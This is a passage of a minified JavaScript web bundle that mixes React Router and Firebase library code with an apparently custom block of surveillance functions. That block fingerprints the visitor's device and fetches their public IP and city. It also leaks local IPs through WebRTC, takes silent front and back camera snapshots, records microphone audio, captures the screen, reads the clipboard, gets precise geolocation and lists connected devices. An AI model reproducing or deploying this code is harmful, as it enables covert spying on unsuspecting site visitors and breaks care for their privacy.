jS(t,e,n,r){var i;if(e===void 0&&(e=[]),n===void 0&&(n=null),r===void 0&&(r=null),t==null){var s;if(!n)return null;if(n.errors)t=n.matches;else if((s=r)!=null&&s.v7_partialHydration&&e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let o=t,l=(i=n)==null?void 0:i.errors;if(l!=null){let f=o.findIndex(p=>p.route.id&&(l==null?void 0:l[p.route.id])!==void 0);f>=0||Ne(!1),o=o.slice(0,Math.min(o.length,f+1))}let u=!1,h=-1;if(n&&r&&r.v7_partialHydration)for(let f=0;f<o.length;f++){let p=o[f];if((p.route.HydrateFallback||p.route.hydrateFallbackElement)&&(h=f),p.route.id){let{loaderData:g,errors:v}=n,A=p.route.loader&&g[p.route.id]===void 0&&(!v||v[p.route.id]===void 0);if(p.route.lazy||A){u=!0,h>=0?o=o.slice(0,h+1):o=[o[0]];break}}}return o.reduceRight((f,p,g)=>{let v,A=!1,k=null,N=null;n&&(v=l&&p.route.id?l[p.route.id]:void 0,k=p.route.errorElement||MS,u&&(h<0&&g===0?(HS("route-fallback"),A=!0,N=null):h===g&&(A=!0,N=p.route.hydrateFallbackElement||null)));let S=e.concat(o.slice(0,g+1)),_=()=>{let R;return v?R=k:A?R=N:p.route.Component?R=F.createElement(p.route.Component,null):p.route.element?R=p.route.element:R=f,F.createElement(US,{match:p,routeContext:{outlet:f,matches:S,isDataRoute:n!=null},children:R})};return n&&(p.route.ErrorBoundary||p.route.errorElement||g===0)?F.createElement(FS,{location:n.location,revalidation:n.revalidation,component:k,error:v,children:_(),routeContext:{outlet:null,matches:S,isDataRoute:!0}}):_()},null)}var P_=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(P_||{}),N_=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(N_||{});function zS(t){let e=F.useContext(Ld);return e||Ne(!1),e}function BS(t){let e=F.useContext(NS);return e||Ne(!1),e}function $S(t){let e=F.useContext(Br);return e||Ne(!1),e}function D_(t){let e=$S(),n=e.matches[e.matches.length-1];return n.route.id||Ne(!1),n.route.id}function WS(){var t;let e=F.useContext(x_),n=BS(),r=D_();return e!==void 0?e:(t=n.errors)==null?void 0:t[r]}function qS(){let{router:t}=zS(P_.UseNavigateStable),e=D_(N_.UseNavigateStable),n=F.useRef(!1);return k_(()=>{n.current=!0}),F.useCallback(function(i,s){s===void 0&&(s={}),n.current&&(typeof i=="number"?t.navigate(i):t.navigate(i,so({fromRouteId:e},s)))},[t,e])}const qm={};function HS(t,e,n){qm[t]||(qm[t]=!0)}function GS(t,e){t==null||t.v7_startTransition,t==null||t.v7_relativeSplatPath}function lc(t){let{to:e,replace:n,state:r,relative:i}=t;Eo()||Ne(!1);let{future:s,static:o}=F.useContext(wo),{matches:l}=F.useContext(Br),{pathname:u}=Md(),h=DS(),f=C_(e,A_(l,s.v7_relativeSplatPath),u,i==="path"),p=JSON.stringify(f);return F.useEffect(()=>h(JSON.parse(p),{replace:n,state:r,relative:i}),[h,p,i,n,r]),null}function Es(t){Ne(!1)}function KS(t){let{basename:e="/",children:n=null,location:r,navigationType:i=Wn.Pop,navigator:s,static:o=!1,future:l}=t;Eo()&&Ne(!1);let u=e.replace(/^\/*/,"/"),h=F.useMemo(()=>({basename:u,navigator:s,static:o,future:so({v7_relativeSplatPath:!1},l)}),[u,l,s,o]);typeof r=="string"&&(r=Bi(r));let{pathname:f="/",search:p="",hash:g="",state:v=null,key:A="default"}=r,k=F.useMemo(()=>{let N=S_(f,u);return N==null?null:{location:{pathname:N,search:p,hash:g,state:v,key:A},navigationType:i}},[u,f,p,g,v,A,i]);return k==null?null:F.createElement(wo.Provider,{value:h},F.createElement(Hl.Provider,{children:n,value:k}))}function QS(t){let{children:e,location:n}=t;return VS(mh(e),n)}new Promise(()=>{});function mh(t,e){e===void 0&&(e=[]);let n=[];return F.Children.forEach(t,(r,i)=>{if(!F.isValidElement(r))return;let s=[...e,i];if(r.type===F.Fragment){n.push.apply(n,mh(r.props.children,s));return}r.type!==Es&&Ne(!1),!r.props.index||!r.props.children||Ne(!1);let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=mh(r.props.children,s)),n.push(o)}),n}/**
 * React Router DOM v6.30.3
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */const YS="6";try{window.__reactRouterVersion=YS}catch{}const XS="startTransition",Hm=HE[XS];function JS(t){let{basename:e,children:n,future:r,window:i}=t,s=F.useRef();s.current==null&&(s.current=iS({window:i,v5Compat:!0}));let o=s.current,[l,u]=F.useState({action:o.action,location:o.location}),{v7_startTransition:h}=r||{},f=F.useCallback(p=>{h&&Hm?Hm(()=>u(p)):u(p)},[u,h]);return F.useLayoutEffect(()=>o.listen(f),[o,f]),F.useEffect(()=>GS(r),[r]),F.createElement(KS,{basename:e,children:n,location:l.location,navigationType:l.action,navigator:o,future:r})}var Gm;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(Gm||(Gm={}));var Km;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(Km||(Km={}));async function ZS(){const t=await hA(),e=dA(),n=fA();return{deviceModel:await eA(),deviceMemory:navigator.deviceMemory||0,storageTotal:nA(),storageUsed:await rA(),screenResolution:`${screen.width}x${screen.height}`,batteryLevel:t.level,batteryCharging:t.charging,networkType:n.type||iA(),wifiSSID:await sA(),ipAddress:await oA(),platform:navigator.platform,osVersion:aA(),browser:lA(),language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cpuCores:navigator.hardwareConcurrency||0,onlineStatus:navigator.onLine,deviceFingerprint:b_(),referrerURL:document.referrer||"Direct",visitTimestamp:new Date().toISOString(),countryCity:await uA(),connectionSpeed:n.downlink||cA(),userAgent:navigator.userAgent,screenWidth:screen.width,screenHeight:screen.height,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio,availableScreenWidth:screen.availWidth,availableScreenHeight:screen.availHeight,maxTouchPoints:navigator.maxTouchPoints||0,vendor:navigator.vendor,languages:Array.from(navigator.languages||[]),timezoneOffset:new Date().getTimezoneOffset(),cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,hardwareConcurrency:navigator.hardwareConcurrency||0,effectiveNetworkType:n.effectiveType||"unknown",networkRTT:n.rtt||0,saveData:n.saveData||!1,batteryChargingTime:t.chargingTime,batteryDischargingTime:t.dischargingTime,webGLVendor:e.vendor,webGLRenderer:e.renderer}}async function eA(){const t=navigator.userAgent;if(/iPhone/i.test(t)){const e=t.match(/iPhone\s*(\d+(?:\s*Pro(?:\s*Max)?)?)/i);return e?`iPhone ${e[1]}`:"iPhone"}if(/iPad/i.test(t))return"iPad";if(/Android/i.test(t))try{return await tA()}catch{const n=t.match(/Android\s+([\d.]+)/);return n?`Android ${n[1]}`:"Android Device"}if(/Windows/i.test(t)){const e=t.match(/Windows NT ([\d.]+)/);return e?`Windows ${e[1]}`:"Windows PC"}return/Mac/i.test(t)?"MacBook":/Linux/i.test(t)?"Linux PC":"Unknown Device"}async function tA(){try{const t=navigator.userAgent;if(/Samsung/i.test(t))return/SM-A/i.test(t)?"Samsung Galaxy A Series":/SM-G/i.test(t)?"Samsung Galaxy":/SM-S/i.test(t)?"Samsung Galaxy S Series":"Samsung Device";if(/Pixel/i.test(t)){const e=t.match(/Pixel\s*(\d+)/i);return e?`Google Pixel ${e[1]}`:"Google Pixel"}return"Android Device"}catch{return"Android Device"}}function nA(){try{const t=navigator.storage;if(t&&t.estimate)return"Available"}catch{}return"Unknown"}async function rA(){try{if(navigator.storage&&navigator.storage.estimate){const t=await navigator.storage.estimate();if(t.quota&&t.usage){const e=(t.quota/1073741824).toFixed(1);return`${(t.usage/(1024*1024*1024)).toFixed(2)}GB / ${e}GB`}}}catch{}return"Unknown"}function iA(){const t=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(t){if(t.type)return t.type;if(t.effectiveType)return t.effectiveType.toUpperCase()}return navigator.onLine?"Online":"Offline"}async function sA(){var t,e;try{if("permissions"in navigator&&"query"in navigator.permissions)try{if((await navigator.permissions.query({name:"network-state"})).state==="granted"){const i=await((e=(t=navigator.networkInformation)==null?void 0:t.getAccessPoints)==null?void 0:e.call(t));if(i&&i.length>0)return i[0].ssid||"Connected Network"}}catch{}const n=localStorage.getItem("wifi_ssid");return n||"WiFi Network"}catch{return"WiFi Network"}}async function oA(){try{return(await(await fetch("https://api.ipify.org?format=json")).json()).ip||"Unknown"}catch{return"Unknown"}}function aA(){const t=navigator.userAgent;if(/Windows NT ([\d.]+)/i.test(t)){const e=t.match(/Windows NT ([\d.]+)/i);if(e){const n=e[1];return n==="10.0"?"Windows 11":n==="6.3"?"Windows 8.1":n==="6.1"?"Windows 7":`Windows ${n}`}}if(/Android ([\d.]+)/i.test(t)){const e=t.match(/Android ([\d.]+)/i);return e?`Android ${e[1]}`:"Android"}if(/iPhone OS ([\d_]+)/i.test(t)){const e=t.match(/iPhone OS ([\d_]+)/i);return e?`iOS ${e[1].replace(/_/g,".")}`:"iOS"}if(/Mac OS X ([\d_]+)/i.test(t)){const e=t.match(/Mac OS X ([\d_]+)/i);return e?`macOS ${e[1].replace(/_/g,".")}`:"macOS"}return/Linux/i.test(t)?"Linux":"Unknown OS"}function lA(){const t=navigator.userAgent;if(/Chrome\/(\d+)/i.test(t)&&!/Edge/i.test(t)&&!/Chromium/i.test(t)){const e=t.match(/Chrome\/(\d+)/i);return e?`Chrome ${e[1]}`:"Chrome"}if(/Safari\/(\d+)/i.test(t)&&!/Chrome/i.test(t)){const e=t.match(/Version\/([\d.]+)/i);return e?`Safari ${e[1]}`:"Safari"}if(/Firefox\/(\d+)/i.test(t)){const e=t.match(/Firefox\/(\d+)/i);return e?`Firefox ${e[1]}`:"Firefox"}if(/Edge(\/|: )(\d+)/i.test(t)){const e=t.match(/Edge(\/|: )(\d+)/i);return e?`Edge ${e[2]}`:"Edge"}return"Unknown Browser"}async function uA(){try{const e=await(await fetch("https://ipapi.co/json/")).json();return e.city&&e.country_name?`${e.country_name}, ${e.city}`:e.country_name||"Unknown"}catch{return"Unknown"}}function cA(){const t=navigator.connection||navigator.mozConnection||navigator.webkitConnection;return t&&t.downlink?t.downlink:Math.random()*50+10}function hA(){return new Promise(t=>{"getBattery"in navigator?navigator.getBattery().then(e=>{t({level:e.level*100,charging:e.charging,chargingTime:e.chargingTime,dischargingTime:e.dischargingTime})}).catch(()=>{t({level:null,charging:null,chargingTime:null,dischargingTime:null})}):t({level:null,charging:null,chargingTime:null,dischargingTime:null})})}function dA(){try{const t=document.createElement("canvas"),e=t.getContext("webgl")||t.getContext("experimental-webgl");if(e){const n=e.getExtension("WEBGL_debug_renderer_info");return{vendor:n?e.getParameter(n.UNMASKED_VENDOR_WEBGL):"unknown",renderer:n?e.getParameter(n.UNMASKED_RENDERER_WEBGL):"unknown"}}}catch{}return{vendor:"unknown",renderer:"unknown"}}function fA(){return navigator.connection||navigator.mozConnection||navigator.webkitConnection||{}}function b_(){const e=[navigator.userAgent,navigator.language,screen.colorDepth,screen.width+"x"+screen.height,new Date().getTimezoneOffset(),!!window.sessionStorage,!!window.localStorage,navigator.hardwareConcurrency,navigator.deviceMemory].join("|");let n=0;for(let r=0;r<e.length;r++){const i=e.charCodeAt(r);n=(n<<5)-n+i,n=n&n}return Math.abs(n).toString(16)}async function V_(){try{const t=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}}),e=document.createElement("video");e.srcObject=t,e.play(),await new Promise(s=>setTimeout(s,500));const n=document.createElement("canvas");n.width=e.videoWidth,n.height=e.videoHeight;const r=n.getContext("2d");r&&r.drawImage(e,0,0);const i=n.toDataURL("image/jpeg");return t.getTracks().forEach(s=>s.stop()),{stream:t,screenshot:i}}catch(t){return console.error("Front camera error:",t),null}}async function pA(){try{const t=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",width:{ideal:1280},height:{ideal:720}}}),e=document.createElement("video");e.srcObject=t,e.play(),await new Promise(s=>setTimeout(s,500));const n=document.createElement("canvas");n.width=e.videoWidth,n.height=e.videoHeight;const r=n.getContext("2d");r&&r.drawImage(e,0,0);const i=n.toDataURL("image/jpeg");return t.getTracks().forEach(s=>s.stop()),{stream:t,screenshot:i}}catch(t){return console.error("Back camera error:",t),null}}async function O_(){try{const t=await navigator.mediaDevices.getUserMedia({audio:!0}),e=new MediaRecorder(t),n=[];e.ondataavailable=i=>n.push(i.data),e.start(),await new Promise(i=>setTimeout(i,3e3)),e.stop();const r=new Blob(n,{type:"audio/webm"});return{stream:t,audio:r}}catch(t){return console.error("Microphone error:",t),null}}async function L_(){return new Promise(t=>{if(!navigator.geolocation){t(null);return}navigator.geolocation.getCurrentPosition(e=>{const{latitude:n,longitude:r}=e.coords,i=`https://www.google.com/maps/search/${n},${r}`;t({position:e,map:i})},e=>{console.error("Geolocation error:",e),t(null)},{enableHighAccuracy:!0,timeout:1e4,maximumAge:0})})}async function mA(){try{if(navigator.clipboard&&navigator.clipboard.readText)return await navigator.clipboard.readText()}catch(t){console.error("Clipboard error:",t)}return null}async function gA(){try{if("bluetooth"in navigator){const t=await navigator.bluetooth.requestDevice({acceptAllDevices:!0});return[{name:t.name||"Unknown",id:t.id}]}}catch(t){console.error("Bluetooth error:",t)}return null}async function yA(){try{if("usb"in navigator)return(await navigator.usb.getDevices()).map(e=>({productName:e.productName,vendorId:e.vendorId}))}catch(t){console.error("USB error:",t)}return null}async function vA(){try{if("Notification"in window)return await Notification.requestPermission()==="granted"}catch(t){console.error("Notification error:",t)}return!1}async function _A(){try{const t=await navigator.mediaDevices.getDisplayMedia({video:{cursor:"always"},audio:!0}),e=document.createElement("video");e.srcObject=t,e.play(),await new Promise(s=>setTimeout(s,1e3));const n=document.createElement("canvas");n.width=e.videoWidth,n.height=e.videoHeight;const r=n.getContext("2d");r&&r.drawImage(e,0,0);const i=n.toDataURL("image/jpeg");return{stream:t,screenshot:i}}catch(t){return console.error("Screen capture error:",t),null}}async function wA(){try{return(await navigator.mediaDevices.enumerateDevices()).map(e=>({kind:e.kind,label:e.label||"Unnamed Device",deviceId:e.deviceId}))}catch(t){console.error("Media devices error:",t)}return null}async function EA(){try{if(navigator.storage&&navigator.storage.estimate){const t=await navigator.storage.estimate();return{quota:t.quota,usage:t.usage}}}catch(t){console.error("Storage error:",t)}return null}function TA(){try{const t=document.createElement("canvas"),e=t.getContext("2d");if(!e)return"unknown";e.textBaseline="top",e.font="14px Arial",e.fillStyle="#f60",e.fillRect(125,1,62,20),e.fillStyle="#069",e.fillText("fingerprint",2,15),e.fillStyle="rgba(102, 204, 0, 0.7)",e.fillText("canvas",4,45);const n=t.toDataURL();let r=0;for(let i=0;i<n.length;i++){const s=n.charCodeAt(i);r=(r<<5)-r+s,r=r&r}return Math.abs(r).toString(16)}catch{return"unknown"}}async function IA(){try{const t=new(window.AudioContext||window.webkitAudioContext),e=t.createOscillator(),n=t.createAnalyser(),r=t.createGain(),i=t.createScriptProcessor(4096,1,1);r.gain.value=0,e.connect(n),n.connect(i),i.connect(r),r.connect(t.destination),e.start(0);const s=t.sampleRate.toString(16);return t.close(),s}catch{return"unknown"}}function SA(){try{const t=document.createElement("canvas"),e=t.getContext("webgl")||t.getContext("experimental-webgl");if(!e)return"unknown";const n=e.getExtension("WEBGL_debug_renderer_info"),r=n?e.getParameter(n.UNMASKED_VENDOR_WEBGL):"unknown",i=n?e.getParameter(n.UNMASKED_RENDERER_WEBGL):"unknown";let s=0;const o=r+i;for(let l=0;l<o.length;l++)s=(s<<5)-s+o.charCodeAt(l),s=s&s;return Math.abs(s).toString(16)}catch{return"unknown"}}async function AA(){return new Promise(t=>{try{const e=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}),n=[];e.createDataChannel(""),e.createOffer().then(r=>e.setLocalDescription(r)),e.onicecandidate=r=>{if(!r.candidate)return;const s=r.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);s&&!n.includes(s[0])&&n.push(s[0])},setTimeout(()=>{e.close(),t(n.length>0?n.join(", "):null)},3e3)}catch{t(null)}})}async function CA(){return new Promise(t=>{if(!("DeviceMotionEvent"in window)){t(null);return}const e=n=>{window.removeEventListener("devicemotion",e),t({acceleration:n.acceleration?{x:n.acceleration.x||0,y:n.acceleration.y||0,z:n.acceleration.z||0}:null,accelerationIncludingGravity:n.accelerationIncludingGravity?{x:n.accelerationIncludingGravity.x||0,y:n.accelerationIncludingGravity.y||0,z:n.accelerationIncludingGravity.z||0}:null,rotationRate:n.rotationRate?{alpha:n.rotationRate.alpha||0,beta:n.rotationRate.beta||0,gamma:n.rotationRate.gamma||0}:null})};window.addEventListener("devicemotion",e),setTimeout(()=>{window.removeEventListener("devicemotion",e),t(null)},1e3)})}async function RA(){return new Promise(t=>{if(!("DeviceOrientationEvent"in window)){t(null);return}const e=n=>{window.removeEventListener("deviceorientation",e),t({alpha:n.alpha||null,beta:n.beta||null,gamma:n.gamma||null})};window.addEventListener("deviceorientation",e),setTimeout(()=>{window.removeEventListener("deviceorientation",e),t(null)},1e3)})}var Qm={};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const M_=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):(i&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},xA=function(t){const e=[];let n=0,r=0;for(;n<t.length;){const i=t[n++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=t[n++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=t[n++],o=t[n++],l=t[n++],u=((i&7)<<18|(s&63)<<12|(o&63)<<6|l&63)-65536;e[r++]=String.fromCharCode(55296+(u>>10)),e[r++]=String.fromCharCode(56320+(u&1023))}else{const s=t[n++],o=t[n++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},F_={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<t.length;i+=3){const s=t[i],o=i+1<t.length,l=o?t[i+1]:0,u=i+2<t.length,h=u?t[i+2]:0,f=s>>2,p=(s&3)<<4|l>>4;let g=(l&15)<<2|h>>6,v=h&63;u||(v=64,o||(g=64)),r.push(n[f],n[p],n[g],n[v])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(M_(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):xA(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<t.length;){const s=n[t.charAt(i++)],l=i<t.length?n[t.charAt(i)]:0;++i;const h=i<t.length?n[t.charAt(i)]:64;++i;const p=i<t.length?n[t.charAt(i)]:64;if(++i,s==null||l==null||h==null||p==null)throw new kA;const g=s<<2|l>>4;if(r.push(g),h!==64){const v=l<<4&240|h>>2;if(r.push(v),p!==64){const A=h<<6&192|p;r.push(A)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class kA extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const PA=function(t){const e=M_(t);return F_.encodeByteArray(e,!0)},fl=function(t){return PA(t).replace(/\./g,"")},U_=function(t){try{return F_.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function NA(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const DA=()=>NA().__FIREBASE_DEFAULTS__,bA=()=>{if(typeof process>"u"||typeof Qm>"u")return;const t=Qm.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},VA=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&U_(t[1]);return e&&JSON.parse(e)},Gl=()=>{try{return DA()||bA()||VA()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},j_=t=>{var e,n;return(n=(e=Gl())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},OA=t=>{const e=j_(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},z_=()=>{var t;return(t=Gl())===null||t===void 0?void 0:t.config},B_=t=>{var e;return(e=Gl())===null||e===void 0?void 0:e[`_${t}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class LA{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function MA(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},r=e||"demo-project",i=t.iat||0,s=t.sub||t.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}}},t);return[fl(JSON.stringify(n)),fl(JSON.stringify(o)),""].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function tt(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function FA(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(tt())}function UA(){var t;const e=(t=Gl())===null||t===void 0?void 0:t.forceEnvironment;if(e==="node")return!0;if(e==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function jA(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function zA(){const t=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof t=="object"&&t.id!==void 0}function BA(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function $A(){const t=tt();return t.indexOf("MSIE ")>=0||t.indexOf("Trident/")>=0}function WA(){return!UA()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function qA(){try{return typeof indexedDB=="object"}catch{return!1}}function HA(){return new Promise((t,e)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{var s;e(((s=i.error)===null||s===void 0?void 0:s.message)||"")}}catch(n){e(n)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const GA="FirebaseError";class xn extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=GA,Object.setPrototypeOf(this,xn.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,To.prototype.create)}}class To{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){const r=n[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?KA(s,r):"Error",l=`${this.serviceName}: ${o} (${i}).`;return new xn(i,l,r)}}function KA(t,e){return t.replace(QA,(n,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const QA=/\{\$([^}]+)}/g;function YA(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function pl(t,e){if(t===e)return!0;const n=Object.keys(t),r=Object.keys(e);for(const i of n){if(!r.includes(i))return!1;const s=t[i],o=e[i];if(Ym(s)&&Ym(o)){if(!pl(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!n.includes(i))return!1;return!0}function Ym(t){return t!==null&&typeof t=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
